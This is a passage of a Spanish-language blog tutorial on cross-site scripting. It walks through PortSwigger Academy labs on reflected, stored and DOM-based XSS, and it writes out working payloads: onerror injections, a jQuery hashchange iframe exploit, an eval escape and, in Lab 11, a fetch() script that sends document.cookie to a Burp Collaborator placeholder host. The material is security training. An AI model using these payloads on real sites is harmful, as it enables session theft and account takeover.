+<p>Podemos observar que tenemos una barra que nos permite buscar en el contenido de la aplicación web por términos y se despliega el término de nuestra búsqueda en la página de resultados:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425113113.png" text-align="center" />
+</div>
+
+<p>Así, introducimos en el valor del parámetro “search” de la URL la línea:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">HOLA</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425113330.png" text-align="center" />
+</div>
+
+<p>Comprobando que efectivamente se trata de un sitio vulnerable a un ataque XSS.</p>
+
+<p><br /></p>
+
+<h5 id="212-impacto-del-reflected-xss">2.1.2. Impacto del reflected XSS.</h5>
+
+<p>Si un atacante puede construir un script que se ejecuta en el navegador de la víctima ha comprometido totalmente a la misma. Entre otras cosas:</p>
+
+<ul>
+  <li>Puede <strong>realizar acciones</strong> por el usuario dentro de la aplicación web.</li>
+  <li>Puede <strong>ver</strong> toda la información que el usuario sea capaz de ver, entre ella, información sensible.</li>
+  <li>Puede <strong>modificar</strong> toda la información que el usuario sea capaz de modificar.</li>
+  <li>Puede <strong>iniciar interacciones maliciosas</strong> con otros usaurios como si fuera el usuario original.</li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="213-exploración-de-reflected-xss">2.1.3. Exploración de Reflected XSS.</h5>
+
+<p>Para llevar a cabo una exploración manual de reflected XSS nos centramos en:</p>
+
+<ul>
+  <li>
+    <p><strong>Testar cualquier punto de entrada de datos, input</strong>.</p>
+  </li>
+  <li>
+    <p><strong>Emitir valores alfanuméricos y comprobar si tales valores aparecen en algún punto de la respuesta HTTP</strong></p>
+  </li>
+  <li>
+    <p><strong>Determinar el contexto del XSS en función de los datos anteriores y coger el payload que más se adapte</strong></p>
+  </li>
+  <li>
+    <p><strong>Testaer payloads alternativos</strong>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="22-stored-xss">2.2. Stored XSS.</h4>
+
+<h5 id="221-definición">2.2.1. Definición.</h5>
+
+<p>El Stored XSS también conocido como XSS persistente o XSS de segundo orden es una variante de XSS en el que una aplicación web acepta input de una procedencia no confiable y el payload malicioso que se introduce queda incrustado de forma permanente en una página de la aplicación web. (Ejemplos de esto sería por ejemplo, comentarios, nickname de usuarios, etc) De forma que cualquiera que visitará dicha página estaría recibiendo un html malicioso del servidor provocado por este payload permanente.</p>
+
+<p>Veámos un ejemplo; supongámos un sitio web que permite a un usuario emitir comentarios en un blog, los cuales pueden ser vistos por otros usuarios.</p>
+
+<p>De esta forma el suuario emite un comentario en una request HTTP como la siguiente:</p>
+
+<pre><code class="language-default">POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 100
+
+postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net
+</code></pre>
+
+<p>Cuando se recibe este post, el servidor añadirá en el html de la página la cabecera:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>This post was extremely helpful.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Y como tal estará visible para cualquier usuario que entre en dicha página ya que esta ha sido modificada permanentemente.</p>
+
+<p>Así, si asumimos que la página no realiza ningún tipo de control sobre lo que se introduce, un atacante podría introducir un script malicioso de Java Script</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="cm">/* Bad stuff here... */</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>encodeandolo tipo URL en el cuerpo de la request:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
+</code></pre></div></div>
+
+<p>que quedaría permanentemente en el HTML de la página y que, en consecuencia, se ejecutaría en el navegador de cualquiera que visitase la página.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="cm">/* Bad stuff here... */</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Stored XSS into HTML context with nothing encoded</strong>.</p>
+
+<p>Este laboraotior nos introduce a una aplicación web que permite a los usuarios dejar comentarios en distintos posts.</p>
+
+<p>Hacemos una prueba para comprobar que nuestro post queda incrustado en la página y comprobar qué partes de los datos que introducimos quedan incrustadas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182655.png" text-align="center" />
+</div>
+
+<p>Ahí podemos ver que tanto el nombre como el mensaje quedan incrustados en la página en forma de párrafo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182723.png" text-align="center" />
+</div>
+
+<p>Así, introducimos un script de JavaScript con la finalidad de desplegar una alerta y completar el laboratorio:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182837.png" text-align="center" />
+</div>
+
+<p>Posteamos el comentario y al volver a la página del blog obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182905.png" text-align="center" />
+</div>
+
+<p>Aunque también podríamos haber utilizado como punto de inyección.</p>
+
+<p><br /></p>
+
+<h4 id="222-diferencias-entre-el-stored-y-el-reflected-xss">2.2.2. Diferencias entre el Stored y el Reflected XSS.</h4>
+
+<p>Aunque ambos tienen el mismo impacto. En términos de explotabilidad, <strong>la diferencia clave entre el stored y el reflected XSS es que el primero es un ataque autocontenido dentro de la propia aplicación</strong>. El atacante no necesita encontrar una forma externa de inducir a otros usuarios a realizar una solicitud particular que contenga su exploit. Más bien, el atacante coloca su exploit en la propia aplicación y simplemente espera a que los usuarios lo encuentren, es en ese sentido mucho más dañino.</p>
+
+<p><br /></p>
+
+<h4 id="223-exploración-de-stored-xss-vulnerabilities">2.2.3. Exploración de Stored XSS vulnerabilities.</h4>
+
+<p>Al margen del hecho de que muchas vulnerabilidades XSS Stored pueden ser encontradas utilizando el scanner de burpsuite.</p>
+
+<p>Si se quiere llevar a cabo una búsqueda manual se necesitan buscar todos los posibles puntos de entradas de datos entre los que se incluyen:</p>
+
+<ul>
+  <li>Parámetros dentro de la URL.</li>
+  <li>La propia ruta incluida en la URL.</li>
+  <li>Cabeceras de la HTTP request.</li>
+</ul>
+
+<p>Y aquellos puntos en los que se puede exponer la información introducida, entre los que podemos encontrar:</p>
+
+<ul>
+  <li>Nombres de usuario</li>
+  <li>Comentarios</li>
+  <li>Resultados de búsqueda</li>
+</ul>
+
+<p>Aunque los puntos de salida y los puntos de entrada dependen en gran medida de las funcionalidades de la aplicaicón que pueden ser muy extensas y variadas.</p>
+
+<p><strong>Lo más seguro es intentar identificar todos los puntos de input data de la aplicación e introducir un valor para ver si dicho valor se encuentra en la respuesta HTTP. Si eso sucede, sólo quedaría comprobar si el punto de entrada es efectivamente un punto de inyección verificando si es vulnerable a XSS</strong>.</p>
+
+<p>Observemos que esta es a su vez la misma metodología que seguíamos con el reflected XSS.</p>
+
+<p><br /></p>
+
+<h4 id="23-dom-based-xss">2.3. DOM-based XSS.</h4>
+
+<h5 id="231-antecedentes">2.3.1. Antecedentes.</h5>
+
+<p>DOM es un acrónimo que responde a Document Object Model es una interfaz de plataforma diseñado para la representación documentos de lenguaje de marcas (HTML, XHTML y XML).</p>
+
+<p>El DOM permite el acceso dinámico a través de la programación para acceder, añadir y cambiar dinámicamente contenido estructurado en documentos con lenguajes como JavaScript.</p>
+
+<p>Es decir, que existen páginas que poseen funcionalidades que cambian el contenido de la misma de forma autónoma (sin necesidad de que el servidor envíe una respuesta HTTP) recurriendo al código JavaScript implementado en el DOM de la misma.</p>
+
+<p><br /></p>
+
+<h5 id="232-presentación-de-la-vulnerabilidad">2.3.2. Presentación de la vulnerabilidad.</h5>
+
+<p>De esta forma, en términos sencillos, una DOM-based XSS vulnerability se aprovecha de la falta de validación de la aplicación web un payload malicioso en una fuente HTML (una parte de la página en la que el usuario puede introducir input, como un parámetro de la URL) que termina en un sumidero JavaScript (un fragmento de código que ejecuta una acción, como innerHTML que introduce un parámetro dentro del HTML) del DOM de la misma para provocar un comportamiento nocivo del navegador de la víctima.</p>
+
+<p>El rasgo más característico consiste en que, a diferencia de lo que ocurría con el reflected o el stored XSS, el Dom-based se apoya en el DOM para ejecutar JavaScript malicioso y no necesita del servidor para que se lleve a cabo la incorporación del código JavaScript en la respuesta. Aun así, es necesario recalcar que, aunque se tratan de entidades distintas,</p>
+
+<p>En el siguiente ejemplo, una aplicación usa JavaScript para leer el valor de un campo de entrada y escribir ese valor en un elemento dentro del HTML:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">search</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">results</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">results</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">results</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">You searched for: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">search</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>En el código anterior se puede observar como se selecciona un elemento cuyo ID es “search” y se obtiene su valor almacenándose en la variable JavaScript ‘search’. Seguidamente, se obtiene un elemento HTML con ID “results” y se redefine empleando innerHTML incrustando el contenido de search de vuelta en la página.</p>
+
+<p>Así, un atacante podría introducir en el parámetro ‘search’ que se introduce dentro del documento HTML código malicioso:</p>
+
+<pre><code class="language-HTML">You searched for: &lt;img src=1 onerror='/* Bad stuff here... */'&gt;
+</code></pre>
+
+<p>Y al ser devuelto en la página, si no se valida adecuadamente, puede ocurrir que se procese el código.</p>
+
+<p>En un caso típico, <strong>el campo de entrada se completaría como parte de la solicitud HTTP, como un parámetro de cadena de consulta de URL, lo que permitiría al atacante realizar un ataque utilizando una URL maliciosa, de la misma manera que en un reflected XSS</strong>.</p>
+
+<p><br /></p>
+
+<h6 id="233-testeo-de-vulnerabilidades-dom-based">2.3.3. Testeo de vulnerabilidades DOM-based.</h6>
+
+<p>Muchas de las vulnerabilidades DOM-based XSS se pueden encontrar de forma rápida y confiable empleando el Burp’s web vulnerability scanner.</p>
+
+<p><br /></p>
+
+<p><strong>Testeando HTML sources</strong></p>
+
+<p>Un <strong>HTML sink</strong> o sumidero HTML es un punto de entrada de datos HTML por parte del usuario que puede ser empleado en un código JavaScript como location.search.</p>
+
+<p>En primer lugar, para testear una posible vulnerabilidad DOM-based XSS, introducimos un término cualquiera e intentamos observar dónde aparece de vuelta en el documento el término que acabamos de introducir. (Podemos utilizar la opción “inspeccionar elemento” y utilizar Ctrl+F para buscar el término en el documento en bruto).</p>
+
+<p>Una vez encontrado, es útil hacer un esfuerzo para intentar comprender cómo se procesa este input introduciendo el mismo input de distintas formas (cambiándo mayúsculas/minúsculas, comillas, redirectores, etc)</p>
+
+<p>Hay que tener en cuenta que los navegadores se comportan de manera diferente con respecto a la codificación de URL, Chrome, Firefox y Safari codificarán en URL <strong>location.search</strong> y <strong>location.hash</strong>, mientras que IE11 y Microsoft Edge (pre-Chromium) no codificarán en URL estas fuentes. <strong>Si sus datos se codifican en URL antes de ser procesados, es poco probable que funcione un ataque XSS</strong>.</p>
+
+<p><br /></p>
+
+<p><strong>Testing JavaScript execution sinks</strong></p>
+
+<p>Un <strong>JavaScript execution sink</strong> es una función JavaScript que procesa una instrucción que ejecuta el navegador. Estas funciones es donde desemboca generalmente el input proporcionado en una HTML source.</p>
+
+<p>Testear estas funciones puede ser un poco más difícil ya que el input puede no volver a aparecer en el documento HTML. En su lugar, se hace uso de un debbuger de JavaScript.</p>
+
+<p>Una buena herramienta es DOM-based XSS.</p>
+
+<p><br /></p>
+
+<h6 id="234-exploiting-de-dom-based-xss-con-diferentes-fuentes-y-sumideros">2.3.4. Exploiting de DOM-based XSS con diferentes fuentes y sumideros.</h6>
+
+<p>Técnicamente, un sitio web es vulnerable al DOM-based XSS cuando existe una ruta ejecutable por la cual los datos proporcionados pueden viajar desde una fuente a un sumidero.</p>
+
+<p>En la práctica, los diferentes fuentes y sumideros existentes tienen diferentes propiedades y comportamientos que pueden afectar a la explotabilidad.</p>
+
+<p>Además, los scripts del sitio web pueden realizar un procesamiento de datos al que debemos acomodarnos a la hora de aprovechar una vulnerabilidad. Hay una variedad de sumideros que son relevantes para las vulnerabilidades basadas en DOM. Se expondrá una lista más adelante.</p>
+
+<p>El sumidero document.write funciona con elementos de secuencia de comandos, por lo que puede usar una carga útil simple, como la siguiente:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: DOM XSS in “document.write” sink using source “location.search”</strong></p>
+
+<p>Antes de comenzar con el laboratorio, debemos tratar la funcionalidad de los dos sinks que tratamos aquí, <em>document.write</em> y <em>location.search</em>.</p>
+
+<ul>
+  <li>
+    <p><strong>document.write</strong>: Este es un método del lenguaje del DOM HTML que escribe directamente sobre el documento HTML admitiendo etiquetas HTML.</p>
+  </li>
+  <li>
+    <p><strong>location.search</strong>: Es un objeto javascript que devuelve la “querystring” de la URL del usuario.</p>
+  </li>
+</ul>
+
+<p>Observemos por tanto que ambos objetos pueden ser empleados en una ruta ejecutable que coloque el input del usuario a través de los parámetros de búsqueda dentro del documento HTML del navegador.</p>
+
+<p>Este laboratorio simula una aplicación web vulnerable a DOM-based XSS debudi a que utiliza la función JavaScript <em>document.write</em> para escribir datos dentro de la página llamándola con contenido obtenido desde <em>location.search</em>, contenido que puede ser controlado por el usuario desde la URL.</p>
+
+<p>De esta forma, accedemos al laboratorio y observamos que tiene una funcionalidad de búsqueda. Procedemos a llevar a cabo un proceso de exploración del procesamiento de nuestro input en la web. Observamos que nuestro input se coloca en dos sitios.</p>
+
+<p>Por un lado, se coloca en forma de texto en el documento HTML y por otro en un elemento img src:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517131250.png" text-align="center" />
+</div>
+
+<p>El primero está protegido frente a un ataque XSS, pero el segundo es vulnerable cerrando correctamente el elemento HTML en primer lugar y luego construyéndo un elemento script:</p>
+
+<pre><code class="language-HTML">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<p>Así, el razonmiento consiste en que el document.write construyen un objeto HTML “img src” en el que coloca nuestro output sin validar los datos que introducimos volviendo la aplicación vulnerable a un ataque XSS sobre el DOM.</p>
+
+<p><br /></p>
+
+<p>También puede ocurrir que se obtengan valores de la URL a partir de un script de JavaScript visible en el documento HTML.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: DOM XSS in document.write sink source location.search inside select element</strong></p>
+
+<p>Este laboratorio contiene una DOM XSS vulnerability en la funcionalidad “stock check” de un producto. La página construye un elemento HTML <em>select</em> utilizando <em>location.search</em> en la función <em>document.write</em>:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kd">var</span> <span class="nx">stores</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">London</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Paris</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Milan</span><span class="dl">"</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">store</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">storeId</span><span class="dl">'</span><span class="p">);</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;select name="storeId"&gt;</span><span class="dl">'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="nx">store</span><span class="p">)</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;option selected&gt;</span><span class="dl">'</span><span class="o">+</span><span class="nx">store</span><span class="o">+</span><span class="dl">'</span><span class="s1">&lt;/option&gt;</span><span class="dl">'</span><span class="p">);}</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">stores</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">stores</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="nx">store</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;option&gt;</span><span class="dl">'</span><span class="o">+</span><span class="nx">stores</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&lt;/option&gt;</span><span class="dl">'</span><span class="p">);</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;/select&gt;</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Observemos que mediante un .get se obtiene el parámetro storeId de la URL y que el valor de este mismo parámetro se instaura dentro de un select element dentro de document.write, además hay que advertir que necesitamos respetar la sintaxis. Así, añadimos en la URL de la página el parámetro:</p>
+
+<pre><code class="language-default">/products?productId=1&amp;storeId="&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;
+</code></pre>
+
+<p>Cerramos el elemento select y añadimos un elemento img src falso que desencadena el handler onerror que despliega una alerta. Aunque también podríamos haber introducido un script que despliege la misma alerta.</p>
+
+<p><br /></p>
+
+<p>Por otra parte tenemos el sumidero <em>innerHTML</em>.</p>
+
+<ul>
+  <li><strong>innerHTML</strong>: La propiedad <em>innerHTML</em> es parte del DOM y permite que el código Javascript manipule elementos HTML en tiempo real. Específicamente, permite leer y reemplazar todo dentro de un elemento DOM dado (etiqueta HTML).</li>
+</ul>
+
+<p><strong>Este no acepta el elemento &lt;script&gt; y por tanto, para desplegar una alerta hará falta emplear errorhandlers de img o iframe</strong></p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: DOM XSS in innerHTML sink using source location.search</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM XSS en la funcionalidad “search” del blog. Emplea un <em>innerHTML</em> para cambiar el contenido del HTML utilizando los datos proporcionados por <em>location.search</em></p>
+
+<p>Así, accdemos al laboratorio e introducimos el término TEST en la barra buscadora. De esta forma encontramos que el término TEST aparece en la respuesta HTTP.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517164403.png" text-align="center" />
+</div>
+
+<p>Examinando más afondo el documento HTML encontramos que este es el valor que se encuentra dentro de una etiqueta &lt;span&gt; y que tiene un atributo mencionado como id = searchMessage.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517164420.png" text-align="center" />
+</div>
+
+<p>Es decir, que el contenido se obtiene del valor de la variable que tiene por nombre searchMessage y a su vez, buscando el término searchMessage llegamos a un script de javascript que procesa el contenido de dicha variable con InnerHTML, que este localiza el contenido de la variable “query” qie a su vez deriva en el parámetro search de la URL.</p>
+
+<p>Es decir, que el valor del parámetro “search” que es lo que nosotros buscámos se coloca de vuelta dentro del documento HTML por medio del método innerHTML. Con lo que no podemos emplear una etiqueta script, lo hacemos con un errorhandler de img src.</p>
+
+<p><br /></p>
+
+<ul>
+  <li>Otra serie de sumideros que pueden alterar el HTML de una página y estar presentes son aquellos que se utilizan en librerias como jQuery. Un ejemplo es <em>attr()</em>, que cambia el valor de un atributo de un elemento dado.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: DOM XSS in jQuery anchor href attribute sink using location.search source</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM-based XSS en la funcionalidad de emisión de feedback. Emplear un selector; $ de la librería jQuery para encontrar un elemento <em>anchor</em> y cambiar su elemento <em>href</em> mediante el location.search.</p>
+
+<p>En primer lugar, accedemos al laboratorio y vamos a la pestaña que nos permite emitir feedback y comprobamos la existencia de un parámetro en la URL; <em>retunPath</em>. Al testearlo, comprobamos que el valor del parámetro se introduce de nuevo en del documento HTML en forma de una referencia sobre un botón Back:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518103134.png" text-align="center" />
+</div>
+
+<p>Además, tenemos acceso al script que lo configura. En él podemos observar que toma el valor de “backlink” y modifica el valor del atributo “href” cofiendo los datos de location.search, en concreto, nuestro parámetro retunPath.</p>
+
+<p>Así, podemos modificar el valor de href para que tenga un comportamiento malicioso;</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518103454.png" text-align="center" />
+</div>
+
+<p>Y al pulsar el botón Back se ejecutará el código JavaScript que sigue a los dos puntos.</p>
+
+<p><br /></p>
+
+<ul>
+  <li>Otro sumidero potencial dentro de la librería jQuery’s es la <em>función selector $()</em> el cual puede ser utilizado para inyectar objetos maliciosos dentro del DOM.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: DOM XSS in jQuery selector sink using a hashchange event</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM-based XSS en la página home. Emplea un selector $() de jQuery para llevar al usuario con un auto-scroll al post seleccionado cuyo título se pasa mediante <em>location.hash</em>. Es decir, la página te traslada con el scroll automáticamente al lugar en el que se encuentre un término (si existe) indicado después de un “hashtag” en la URL. /#termino.</p>
+
+<p>Así, por ejemplo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220610165058.png" text-align="center" />
+</div>
+
+<p>Como el término To se introduce en un código JavaScript sin validar, podemos realizar una inyección de código. Asi, si en la URL ponemos: /#&lt;img src=1 onerror=print()&gt; y observamos que se abrira la pestaña de la impresora en nuestro navegador probando que la inyección de código ha sido satisfactoria.</p>
+
+<p>Así, vamos al servidor del exploit y utilizamos un iframe para cargar el contenido de la URL con el payload malicioso:</p>
+
+<pre><code class="language-HTML">&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>y le damos a “deliver to victim” para completar el laboratorio:</p>
+
+<p><br /></p>
+
+<ul>
+  <li>DOM XSS in AngularJS. Si se utiliza un marco de trabajo como AngularJS es posible ejecutar JavaScript malicioso sin paréntesis angulares ni eventos. Cuando un sitio usa el atributo <em>ng-app</em> en un elemento HTML, AngularJS lo procesará. En este caso, AngularJS ejecutará JavaScript dentro de llaves dobles que pueden ocurrir directamente en HTML o dentro de atributos.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: DOM XSS in AngularJS expression with angle brackets and double quots HTML-encoded</strong></p>
+
+<p>Este laboratorio contienw una DOM-based XSS vulnerabilitie en un expresión de AngularJS dentro de la funcionalidad.</p>
+
+<p>Al introducirnos dentro del laboratorio e introducir un string alfanumérico observamos que la etiqueta &lt;body&gt; contiene un atributo denominado ng-app que es un punto de entrada de Angular.</p>
+
+<p>Así, introducimos  y observamos que las llaves no salen. De esta forma, metemos  y resolvemos el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="24-dom-xss-en-combinación-con-reflected-y-stored-xss">2.4. DOM XSS en combinación con Reflected y Stored XSS.</h4>
+
+<p>Suele cometerse el error de que el reflected, stored y DOM-based XSS son entindades separadas, pero la realidad es que son distintos aspectos del mismo ataque y muchas veces pueden estar presentes más de uno.</p>
+
+<p>Sin embargo, <strong>las fuentes no se limitan a los datos expuestos directamente por los navegadores; también pueden originarse en el sitio web</strong>. Por ejemplo, los sitios web a menudo reflejan parámetros de URL en la respuesta HTML del servidor. Esto se asocia comúnmente con XSS normal, pero también puede dar lugar a las denominadas vulnerabilidades reflejadas+DOM.</p>
+
+<p>En una vulnerabilidad reflejada+DOM, el servidor procesa los datos de la solicitud y repite los datos en la respuesta adquiriendo la parted del reflected XSS, pero además, los datos reflejados pueden colocarse en una cadena literal de JavaScript o en un elemento de datos dentro del DOM, como un campo de formulario. Luego, un script en la página procesa los datos reflejados de una manera insegura y, en última instancia, los escribe en un sumidero peligroso adquiriendo la característica .</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: Reflected DOM XSS</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad reflected-DOM XSS. Esta recordamos que es una vulnerabilidad por la que una aplicación web devuelve en una respuesta datos de búsqueda de la request del usuario que luego procesa en un script de JavaScript derivándolo en un sumidero.</p>
+
+<p>Así, accedemos al laboratorio y utilizamos DOM Invader para comprobar dónde está la vulnerabilidad. Podemos observar que nuestros datos se encuentran en un sumidero de <em>eval()</em>. Además, podemos observar que el código no procesa adecuadamente el backslash. De forma que inyectamos: “\-alert(1)}//</p>
+
+<p>Como ha inyectado una barra invertida y el sitio no los escapa, cuando la respuesta JSON intenta escapar del carácter de comillas dobles de apertura, agrega una segunda barra invertida. La doble barra invertida resultante hace que el escape se cancele de manera efectiva. Esto significa que las comillas dobles se procesan sin escape, lo que cierra la cadena que debe contener el término de búsqueda.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 10: Stored DOM XSS</strong></p>
+
+<p>En este caso sucede algo similar al caso anterior en la caja de comentarios, y es que al emplear DOM Invader obtenemos que el término que introducimos pasa a través de un código que codifica los braquets en un intento de proteger de un ataque de inyección HTML:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628200526.png" text-align="center" />
+</div>
+
+<p>Sin embargo, por un fallo de configuración, sólo se codifica una vez y por tanto, es vulnerable a la introducción del término:** &lt;&gt;&lt;img src=1 onerror=alert(1)&gt;**.</p>
+
+<p><br /></p>
+
+<h3 id="3-utilidad-de-las-distintas-vulnerabilidades-xss">3. Utilidad de las distintas vulnerabilidades XSS.</h3>
+
+<p>La forma tradicional de demostrar que ha encontrado una vulnerabilidad de secuencias de comandos entre sitios es crear una ventana emergente con la función alert(). Esto no se debe a que XSS tenga algo que ver con las ventanas emergentes; es simplemente una forma de demostrar que puede ejecutar JavaScript arbitrario en un dominio determinado.</p>
+
+<p>Es posible que observe que algunas personas usan alert(document.domain). Esta es una forma de hacer explícito en qué dominio se está ejecutando JavaScript.</p>
+
+<p>A veces querrá ir más allá y probar que una vulnerabilidad XSS es una amenaza real proporcionando un exploit completo. En esta sección, exploraremos tres de las formas más populares y poderosas de explotar una vulnerabilidad XSS.</p>
+
+<p>Sometimes you’ll want to go further and prove that an XSS vulnerability is a real threat by providing a full exploit. In this section, we’ll explore three of the most popular and powerful ways to exploit an XSS vulnerability</p>
+
+<p><br /></p>
+
+<h4 id="31-exploiting-cross-site-scripting-to-steal-cookies">3.1. Exploiting cross-site scripting to steal cookies.</h4>
+
+<p>Robar cookies es una forma tradicional de explotar XSS. La mayoría de las aplicaciones web utilizan cookies para el manejo de la sesión. Puede explotar las vulnerabilidades XSS para enviar las cookies de la víctima a su propio dominio, luego inyectar manualmente las cookies en el navegador y hacerse pasar por la víctima.</p>
+
+<p>En la práctica, este enfoque tiene algunas limitaciones importantes:</p>
+
+<ul>
+  <li>La víctima puede no estar logeada o la sesión</li>
+  <li>Muchas aplicaciones apartan las cookies del JavaScript empleando el HttpOnly flag.</li>
+  <li>La sesión puede estar bloqueada por otros factores ajenos.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 11: Exploiting cross-site scripting to steal cookies</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog.</p>
+
+<p>Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, aproveche la vulnerabilidad para filtrar la cookie de sesión de la víctima y luego use esta cookie para hacerse pasar por la víctima.</p>
+
+<p>Al acceder al laboratorio comprobamos que el parámetro “comment” es susceptible a una inyección HTML simple.</p>
+
+<p>Así empleamos el siguiente script para obtener las cookies de sesión de cualquier usuario que visite dicha página:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); &lt;/script&gt;
+</code></pre>
+
+<p>Y empleamos el cliente de BurpCollaborator para el envío de las cookies de la víctima.</p>
+
+<p>Recuperamos esos parámetros para hacernos pasar por el usuario.</p>
+
+<p><br /></p>
+
+<h4 id="32-exploiting-cross-site-scripting-to-perfom-csrf">3.2. Exploiting cross-site scripting to perfom CSRF.</h4>
+
